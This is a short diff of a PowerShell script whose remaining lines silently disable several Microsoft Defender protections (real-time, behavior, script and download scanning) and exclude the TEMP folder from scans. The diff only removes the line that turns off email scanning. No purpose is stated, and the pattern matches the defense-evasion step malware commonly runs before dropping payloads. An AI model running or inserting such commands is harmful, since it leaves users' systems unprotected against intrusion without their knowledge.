@@ -8,6 +8,5 @@ Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
 Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
 Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
-Set-MpPreference -DisableEmailScanning $true -ErrorAction SilentlyContinue
 Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
